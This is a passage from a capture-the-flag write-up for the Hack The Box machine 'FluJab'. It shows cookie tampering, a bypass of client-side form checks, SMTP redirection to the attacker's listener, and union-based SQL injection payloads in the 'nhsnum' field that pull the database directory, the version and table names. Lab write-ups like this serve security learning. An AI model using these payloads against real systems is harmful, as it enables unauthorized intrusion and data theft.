&lt;h4 id=&quot;the-response-was-a-redirection-to-denied-we-are-sending-3-cookies-in-every-request--modus--patient-and-registered-modus-and-registered-are-base-64-encoded-strings-while-patient-is-an-md5-hash&quot;&gt;The response was a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?denied&lt;/code&gt;. We are sending 3 cookies in every request : &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt; are &lt;code class=&quot;highlighter-rouge&quot;&gt;base-64&lt;/code&gt; encoded strings while &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt; is an &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; hash.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;modus--configurenull&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;Configure=Null&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;registered---f991b5fb6a2939471c7230b2db78225enull&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt;  = &lt;code class=&quot;highlighter-rouge&quot;&gt;f991b5fb6a2939471c7230b2db78225e=Null&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;registered-is-using-the-same-hash-from-patient-after-some-guesses-i-found-that-this-hash-is-for-my-ip-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt; is using the same hash from &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt;, After some guesses I found that this hash is for my ip :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;anyway-we-can-try-to-change-these-values-from-null-to-true-and-see-what-happens-&quot;&gt;Anyway we can try to change these values from &lt;code class=&quot;highlighter-rouge&quot;&gt;Null&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; and see what happens :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;request--1&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?smtp_config HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 15 Jun 2019 10:34:17 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 3735
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-we-can-access-the-page-now&quot;&gt;Great, we can access the page now.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;before-doing-anything-i-noticed-this-message-about-the-whitelist&quot;&gt;Before doing anything I noticed this message about the whitelist:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-requested-whitelist-and-looked-at-the-response-&quot;&gt;I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;/?whitelist&lt;/code&gt; and looked at the response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/34.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;my-ip-wasnt-there-anyway-i-used-python-to-run-a-debugging-smtp-server-&quot;&gt;My ip wasn’t there. Anyway I used python to run a debugging &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-went-to-update-the-smtp-settings-and-add-mine-&quot;&gt;Then I went to update the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; settings and add mine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-got-this-message--a-valid-smtp-domain-address-is-required-so-i-checked-the-source-of-the-form-&quot;&gt;But I got this message : &lt;code class=&quot;highlighter-rouge&quot;&gt;A Valid SMTP Domain Address Is Required&lt;/code&gt;. So I checked the source of the form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt;
	&amp;lt;div class=&quot;row aln-center&quot;&amp;gt;
		&amp;lt;div class=&quot;col-6 &quot;&amp;gt;
				&amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt;
				&amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt;
		&amp;lt;/div&amp;gt;
		&amp;lt;div class=&quot;col-12&quot;&amp;gt;
		&amp;lt;p&amp;gt;
			WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to 
			access this page! &amp;lt;br \&amp;gt; If you are not supposed to 
			change these settings then don't! whitelist will be 
			auto-updated.
		&amp;lt;/p&amp;gt;
			&amp;lt;ul class=&quot;actions&quot;&amp;gt;
				&amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt;
			&amp;lt;/ul&amp;gt;
		&amp;lt;/div&amp;gt;
	&amp;lt;/div&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;its-relying-on-client-side-validation-check-&quot;&gt;It’s relying on client-side validation check :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-means-that-we-can-bypass-it-easily-by-sending-the-data-directly-in-the-request-&quot;&gt;Which means that we can bypass it easily by sending the data directly in the request :&lt;/h4&gt;
&lt;h4 id=&quot;request--2&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?smtp_config HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

mailserver=10.10.xx.xx&amp;amp;port=25&amp;amp;save=Save+Mail+Server+Config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/41.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--i-checked-whitelist-again-and-my-ip-was-added-there-after-i-added-it-in-the-smtp-server-configuration&quot;&gt;Note : I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/?whitelist&lt;/code&gt; again and my ip was added there after I added it in the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server configuration&lt;/h4&gt;
&lt;h4 id=&quot;in-the-patients-section-there-were-some-pages-to-book-an-appointment-book-send-a-reminder-remind-or-to-cancel-an-appointment-cancel-to-book-an-appointment-we-need-a-valid-patients-name-after-some-enumeration-i-found-some-names-in-info-&quot;&gt;In the patients section there were some pages to book an appointment (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?book&lt;/code&gt;), send a reminder (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?remind&lt;/code&gt;) or to cancel an appointment (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?cancel&lt;/code&gt;). To book an appointment we need a valid patient’s name. After some enumeration I found some names in &lt;code class=&quot;highlighter-rouge&quot;&gt;/?info&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-took-b-smith-and-after-some-guesses-i-got-the-right-name-which-was-bob-smith-&quot;&gt;I took B. Smith and after some guesses I got the right name which was Bob Smith :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-email-was-sent-and-we-can-see-that-in-the-python-smtp-server-&quot;&gt;The email was sent and we can see that in the python &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------                                                                                                       
Date: Thu, 13 Jun 2019 14:47:23 +0100                                                                                                       
To: bobsmith1975@gmail.com                                                                                                                  
From: Nurse Julie &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:NHS-943-475-5911
Message-ID: &amp;lt;e1f9b14325c78abda96f5dd82694b7a4@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124



  Dear Mr Bob Smith,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : NHS-943-475-5911
    Code   : Influ-022
    Type   : Injection
    Time   : 09:00
    Date   : 2018-11-30
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-tried-to-go-to-cancel-&quot;&gt;I tried to go to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?cancel&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request--3&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--2&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
HTTP/1.1 302 Found
Date: Thu, 13 Jun 2019 13:50:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /?ERROR=NOT_REGISTERED
Server: ClownWare Proxy
Content-Length: 2060
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-redirected-me-to-errornot_registered-i-looked-at-the-older-requests-and-i-noticed-the-set-cookie-headers-&quot;&gt;It redirected me to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?ERROR=NOT_REGISTERED&lt;/code&gt;. I looked at the older requests and I noticed the &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; headers :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-added-the-info-about-expiration-max-age-and-path-to-my-cookies-and-tried-again-&quot;&gt;So I added the info about expiration, max age and path to my cookies and tried again :&lt;/h4&gt;
&lt;h4 id=&quot;request--4&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--3&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 13 Jun 2019 13:58:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 5128
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/52.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-cancel-an-appointment-we-need-to-provide-the-nhs-number-of-the-patient-however-like-on-the-smtp-configuration-page-it-used-client-side-validation-check-&quot;&gt;To cancel an appointment we need to provide the NHS number of the patient. However like on the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; configuration page it used client-side validation check :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;input type=&quot;text&quot; name=&quot;nhsnum&quot; placeholder=&quot;NHS Number Required&quot; pattern=&quot;NHS-\d{3}-\d{3}-\d{4}&quot; title=&quot; A Valid NHS Number Is Required e.g. NHS-012-345-6789&quot; required&amp;gt;&amp;lt;/br&amp;gt;
  &amp;lt;ul class=&quot;actions&quot;&amp;gt;
    &amp;lt;center&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Cancel Appointment&quot; name=&quot;submit&quot; /&amp;gt;&amp;lt;/center&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;request--5&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?cancel HTTP/1.1
Host: freeflujab.htb
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://freeflujab.htb/?cancel
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/
Connection: close
Upgrade-Insecure-Requests: 1

nhsnum=test&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--4&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 13 Jun 2019 14:13:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Server: ClownWare Proxy
Content-Length: 5204
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-if-we-check-the-smtp-server-we-can-see-that-the-cancellation-email-was-sent-successfully-&quot;&gt;Now if we check the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server we can see that the cancellation email was sent successfully :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:13:40 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:
Message-ID: &amp;lt;219504b93c84fb0e94fef1ae3d31707d@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : test
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;sqli&quot;&gt;SQLi&lt;/h3&gt;
&lt;h4 id=&quot;i-tried-to-play-around-with-that-input-nhsnum-i-tried-a-lot-of-stuff-and-when-i-tried-union-based-sql-injection-i-got-a-hit-a-good-reference&quot;&gt;I tried to play around with that input (&lt;code class=&quot;highlighter-rouge&quot;&gt;nhsnum&lt;/code&gt;), I tried a lot of stuff and when I tried union based &lt;code class=&quot;highlighter-rouge&quot;&gt;sql&lt;/code&gt; injection I got a hit (a good &lt;a href=&quot;http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html&quot;&gt;reference&lt;/a&gt;):&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,@@datadir,4,5;#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-payload-prints-the-data-directory&quot;&gt;This payload prints the data directory.&lt;/h4&gt;
&lt;h4 id=&quot;smtp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:20:32 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:/var/lib/mysql/
Message-ID: &amp;lt;9bcabe79f1782598002cc31abc3bb333@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,@@datadir,4,5;#
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;database-version-&quot;&gt;Database version :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,@@version,4,5;#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:24:50 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
Message-ID: &amp;lt;d2e238de2ef64c5dd385e30472c94d5e@freeflujab.htb&amp;gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,@@version,4,5;#
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-lets-get-the-table-name-&quot;&gt;Great. Let’s get the table name :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;smtp--2&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
